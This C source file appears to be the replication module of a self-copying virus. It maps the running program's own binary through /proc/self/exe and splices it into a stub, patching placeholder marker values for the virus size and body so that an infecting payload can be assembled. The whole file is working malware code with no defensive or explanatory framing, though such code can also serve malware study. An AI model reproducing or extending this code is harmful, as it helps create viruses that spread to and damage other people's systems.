#include "replication.h"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>

static int open_and_map(char *file, int *fd, struct stat *st, char **map) {
    *fd = open(file, O_RDONLY);
    if (*fd < 0) {
        perror("open failed");
        return 1;
    }

    fstat(*fd, st);

    if (!map)
        return 0;

    *map = mmap(NULL, st->st_size, PROT_READ, MAP_SHARED, *fd, 0);
    if (*map == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    return 0;
}

int merge_stub_virus(unsigned char **payload_bin, size_t *payload_size,
                     unsigned char *stub_bin, size_t stub_bin_size,
                     char *virus_map, struct stat *virus_st) {

    *payload_size = stub_bin_size + virus_st->st_size - 1; // overlap 0x33 stub virus
    *payload_bin = malloc(*payload_size);
    memcpy(*payload_bin, stub_bin, stub_bin_size);

    // patch virus_size
    if (*(uint64_t *)(*payload_bin + stub_bin_size-1 -8) == 0x2222222222222222)
        *(uint64_t *)(*payload_bin + stub_bin_size-1 -8) = virus_st->st_size;

    // patch virus
    if (*(*payload_bin + stub_bin_size-1) == 0x33)
        memcpy(*payload_bin + stub_bin_size-1, virus_map, virus_st->st_size);

    return 0;
}

int replication(unsigned char **payload_bin, size_t *payload_size,
                unsigned char *stub_bin, size_t stub_bin_size) {

    int ret = 0;

    int virus_fd = -1;
    struct stat *virus_st = malloc(sizeof(struct stat));
    char *virus_map = NULL;
    if (!virus_st){
        ret = 1;
        goto Error;
    }

    if (open_and_map("/proc/self/exe", &virus_fd, virus_st, &virus_map) != 0) {
        ret = 1;
        goto Error;
    }

    merge_stub_virus(payload_bin, payload_size, stub_bin, stub_bin_size, virus_map, virus_st);

Error:
    if (virus_map != MAP_FAILED && virus_map != NULL) {
        munmap(virus_map, virus_st ? virus_st->st_size : 0);
    }
    free(virus_st);

    if (virus_fd >=0)
        close(virus_fd);
    return ret;
}
